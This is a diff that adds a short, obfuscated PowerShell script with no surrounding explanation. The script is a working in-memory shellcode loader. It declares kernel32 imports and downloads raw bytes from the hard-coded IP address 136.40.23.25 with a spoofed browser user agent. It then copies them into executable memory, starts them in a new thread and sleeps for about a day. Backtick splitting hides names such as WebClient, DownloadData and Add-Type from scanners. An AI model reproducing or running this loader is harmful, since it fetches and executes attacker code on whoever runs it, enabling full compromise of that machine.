@@ -1,0 +1,7 @@
+$FxOsmGanrJHM = @"
+[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);
+[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt64 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt64 dwCreationFlags, IntPtr lpThreadId);
+[DllImport("kernel32.dll")] public static extern UInt64 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliseconds);
+"@;
+
+$OuLufIleGGtJ = New-Object "`N`et.`W`ebc`l`i`ent";$OuLufIleGGtJ.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)");$OuLufIleGGtJ.Headers.Add("Accept", "*/*");$OuLufIleGGtJ.Headers.Add("Accept-Language", "en-gb,en;q=0.5");[Byte[]] $tQnEdRHsREEo = $OuLufIleGGtJ."D`o`wn`l`oa`d`Data"("http://136.40.23.25:80/vPJL");$pAZAhmkkUNfw = New-Object byte[] ($tQnEdRHsREEo.Length - 0);[Array]::Copy($tQnEdRHsREEo, 0, $pAZAhmkkUNfw, 0, ($tQnEdRHsREEo.Length - 0));$lJLrsBWUFdGq = A`d`d-T`y`p`e -memberDefinition $FxOsmGanrJHM -Name "Win32" -namespace `W`in`3`2`F`un`ct`i`on`s -passthru;$dsdBGBIwrKiG=$lJLrsBWUFdGq::VirtualAlloc(0,$pAZAhmkkUNfw.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($pAZAhmkkUNfw, 0, [IntPtr]($dsdBGBIwrKiG.ToInt64()), $pAZAhmkkUNfw.Length);$lJLrsBWUFdGq::CreateThread(0,0,$dsdBGBIwrKiG,0,0,0) | oUT-NuLl;`S`T`A`R`T-`S`l`e`E`p -s `8`6`4`2`0
